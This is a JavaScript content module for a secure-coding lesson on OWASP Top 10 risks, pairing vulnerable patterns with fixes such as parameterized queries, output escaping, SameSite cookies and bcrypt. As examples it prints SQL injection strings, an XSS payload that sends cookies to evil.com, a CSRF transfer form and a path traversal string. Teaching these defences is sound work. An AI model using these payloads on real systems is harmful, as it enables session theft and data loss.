export const content = {
  title: "Security & OWASP Top 10",
  sections: [
    {
      heading: "SQL Injection",
      body: `**SQL injection** is the most dangerous and most common database attack. It occurs when user input is concatenated directly into a SQL query, allowing attackers to execute arbitrary SQL — read all data, delete tables, or bypass authentication.`,
      code: `# ❌ VULNERABLE — never do this
user_input = "' OR '1'='1"
query = f"SELECT * FROM users WHERE email = '{user_input}'"
# Executes: SELECT * FROM users WHERE email = '' OR '1'='1'
# Returns ALL users — authentication bypassed

# ❌ Also vulnerable
query = "SELECT * FROM users WHERE id = " + request.params["id"]
# Input: "1 DROP TABLE users; --"

# ✅ SAFE — always use parameterized queries
# SQLAlchemy ORM (automatically safe)
user = db.query(User).filter(User.email == user_input).first()

# SQLAlchemy core with bound parameters
result = db.execute(text("SELECT * FROM users WHERE email = :email"),
                    {"email": user_input})

# Raw psycopg2 with parameters
cursor.execute("SELECT * FROM users WHERE email = %s", (user_input,))

# The driver escapes user input — it can NEVER alter the query structure
# Rule: NEVER format user input into SQL strings`,
    },
    {
      heading: "Cross-Site Scripting (XSS)",
      body: `**XSS** occurs when user-supplied content is rendered as HTML without escaping, allowing attackers to inject JavaScript that runs in other users' browsers — stealing cookies, session tokens, or performing actions on their behalf.`,
      code: `# ❌ Stored XSS: saving unescaped user content to DB, then rendering it
comment = '<script>document.location="https://evil.com/steal?c="+document.cookie</script>'
# If stored and later rendered as raw HTML → steals every reader's cookies

# ✅ Escape output — modern frameworks do this automatically
# React: JSX escapes by default
<p>{user_comment}</p>   # safe — escaped automatically

# If you must render HTML, use a sanitizer
import bleach
safe_html = bleach.clean(
    user_html,
    tags=["b", "i", "em", "strong", "a"],  # whitelist only safe tags
    attributes={"a": ["href"]},
    strip=True
)

# Content Security Policy header — last line of defense
Content-Security-Policy: default-src 'self'; script-src 'self'
# Prevents inline scripts and scripts from other origins

# HttpOnly cookies prevent JavaScript from reading them
Set-Cookie: session_id=...; HttpOnly; Secure; SameSite=Strict`,
    },
    {
      heading: "CSRF — Cross-Site Request Forgery",
      body: `**CSRF** tricks a logged-in user into making an unwanted request to your API from a malicious website. The attacker's site submits a form or makes a request; the browser includes the victim's cookies automatically.`,
      code: `# The attack:
# 1. User is logged in to bank.com (cookie in browser)
# 2. User visits evil.com
# 3. evil.com has: <form action="https://bank.com/transfer" method="POST">
#                   <input name="to" value="attacker">
#                   <input name="amount" value="10000">
#                  </form> → auto-submitted by JavaScript
# 4. Browser sends the request WITH bank.com session cookie

# Defenses:

# 1. SameSite cookie attribute (modern standard, very effective)
Set-Cookie: session_id=...; SameSite=Strict; Secure; HttpOnly
# SameSite=Strict: cookie NOT sent on cross-site requests
# SameSite=Lax: cookie sent on top-level navigation but not AJAX/forms

# 2. CSRF token (classic defense for form-based apps)
# Server generates a random token per session
# Include it in every state-changing form as a hidden field
# Validate it on the server

# 3. Custom request headers (for AJAX APIs)
# Browsers don't allow custom headers on cross-origin requests without CORS
# If your API requires Authorization: Bearer, CSRF is not possible via forms
# → JWTs in Authorization header are inherently CSRF-safe`,
    },
    {
      heading: "Broken Authentication & Insecure Secrets",
      body: `Authentication vulnerabilities are the second most common OWASP category. Most breaches happen through weak credentials, leaked tokens, or insecure storage.`,
      items: [
        "**Never store plaintext passwords** — use bcrypt (cost factor ≥12) or argon2id. Never MD5, SHA1, or unsalted SHA256.",
        "**Secrets in code** — never hardcode API keys, passwords, or secrets in source code. Use environment variables and secret managers.",
        "**JWT algorithm confusion** — verify the `alg` header in JWTs and only accept the expected algorithm. `alg: none` attack allows unsigned tokens.",
        "**Session fixation** — regenerate the session ID after login. Don't use the pre-login session ID for the authenticated session.",
        "**Account enumeration** — login and password-reset endpoints should return the same error whether the email exists or not. Otherwise attackers can enumerate valid accounts.",
        "**Rate limit authentication endpoints** — prevent brute force. Lock accounts after N failed attempts. Use CAPTCHA for suspicious patterns.",
      ],
    },
    {
      heading: "Input Validation & Other OWASP Risks",
      body: `Validate and sanitize all external input at system boundaries. Assume all input is malicious until proven otherwise.`,
      items: [
        "**Validate all inputs**: type, format, length, allowed values. Use Pydantic (Python) or Zod (JS) to enforce schemas at the boundary.",
        "**Path traversal** — `../../etc/passwd` in file path parameters. Sanitize and use `os.path.basename()`, never join user input directly to file paths.",
        "**Mass assignment** — don't blindly assign request JSON to model fields. Only allow whitelisted fields. Otherwise attackers can set `is_admin=true`.",
        "**Insecure deserialization** — never deserialize untrusted data with `pickle` (Python) or Java ObjectInputStream. Use JSON with schema validation.",
        "**Dependency vulnerabilities** — run `pip audit`, `npm audit`, or Snyk in CI. Outdated packages with known CVEs are a huge attack surface.",
        "**Security headers checklist**: `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Content-Security-Policy`, `Referrer-Policy`.",
      ],
    },
  ],
};
